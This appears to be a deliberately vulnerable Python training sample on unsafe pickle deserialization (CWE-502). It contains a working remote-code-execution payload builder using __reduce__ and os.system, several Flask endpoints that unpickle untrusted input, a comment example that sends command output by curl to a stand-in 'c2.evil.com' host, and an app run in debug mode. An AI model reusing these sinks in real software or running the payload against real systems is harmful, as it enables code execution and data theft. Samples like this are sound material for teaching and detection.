# VULNERABLE: Unsafe Pickle - Remote Code Execution - Training Sample
# CWE-502: Deserialization of Untrusted Data
# Severity: CRITICAL
# Description: pickle.loads() on attacker-controlled data equals RCE;
#              __reduce__ / __reduce_ex__ methods execute during deserialization

import pickle
import pickletools
import io
import os
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)


# ── Demonstration of how pickle RCE works ─────────────────────────────────────

class MaliciousPayload:
    """Shows how an attacker constructs a pickle RCE payload via __reduce__."""
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        # When unpickled, this calls os.system(self.command)
        return (os.system, (self.command,))


def build_rce_payload(command: str) -> bytes:
    """Generates a pickle payload that runs `command` on deserialization."""
    payload = MaliciousPayload(command)
    return pickle.dumps(payload)


# ── Vulnerable sinks ──────────────────────────────────────────────────────────

def unsafe_load(data: bytes):
    """VULNERABLE: Deserializes raw bytes — __reduce__ executes on load."""
    # VULN: data = build_rce_payload("curl http://c2.evil.com/$(id|base64)")
    return pickle.loads(data)


def unsafe_load_from_file(filepath: str):
    """VULNERABLE: Reads and deserializes a pickle file from user-supplied path."""
    # VULN: filepath = "/tmp/attacker_upload.pkl"
    with open(filepath, "rb") as f:
        return pickle.load(f)   # VULN: pickle.load is equally dangerous


def unsafe_load_from_b64(encoded: str):
    """VULNERABLE: Base64-encoded pickle — common evasion technique."""
    # VULN: simple encoding does not sanitize; attacker encodes payload in base64
    raw = base64.b64decode(encoded)
    return pickle.loads(raw)   # VULN


@app.route("/api/session", methods=["POST"])
def restore_session():
    """VULNERABLE: Session state pickled and sent in request body."""
    raw = request.data
    # VULN: attacker sends crafted pickle bytes as the session body
    session_obj = pickle.loads(raw)
    return jsonify({"user": str(session_obj)})


@app.route("/model/predict", methods=["POST"])
def model_predict():
    """VULNERABLE: ML model loaded from path specified in request."""
    model_path = request.json.get("model_path", "")
    # VULN: model_path = "/tmp/uploaded_malicious.pkl"
    with open(model_path, "rb") as f:
        model = pickle.load(f)   # VULN: model file not validated
    return jsonify({"prediction": str(model)})


@app.route("/cache/restore")
def cache_restore():
    """VULNERABLE: Cache value fetched from Redis and deserialized."""
    import fakeredis   # illustrative
    redis_client = fakeredis.FakeRedis()
    key = request.args.get("key", "")
    raw = redis_client.get(key)
    if raw:
        # VULN: attacker poisons cache with malicious pickle bytes
        obj = pickle.loads(raw)
        return jsonify({"data": str(obj)})
    return jsonify({"data": None})


def deserialize_job(queue_message: bytes):
    """VULNERABLE: Background job deserialized from message queue payload."""
    # VULN: attacker publishes malicious pickle to the queue
    job = pickle.loads(queue_message)
    job.execute()   # VULN: even the execute() call may not be reached — __reduce__ already ran


def copy_object(obj_bytes: bytes):
    """VULNERABLE: Simulates object cloning via pickle round-trip."""
    # VULN: obj_bytes is attacker-supplied; loads triggers __reduce__
    return pickle.loads(obj_bytes)


def inspect_payload(data: bytes):
    """VULNERABLE: Even pickletools.dis() triggers pickle parsing (not execution),
    but loads() called afterward is vulnerable."""
    pickletools.dis(io.BytesIO(data))   # informational — not dangerous itself
    # VULN: loading after inspection provides false sense of security
    return pickle.loads(data)          # VULN: still executes __reduce__


if __name__ == "__main__":
    # Demonstrate payload construction (never run in production)
    payload = build_rce_payload("echo PWNED > /tmp/pwned.txt")
    print(f"Payload bytes: {len(payload)}")
    print(f"Base64: {base64.b64encode(payload).decode()}")
    app.run(debug=True)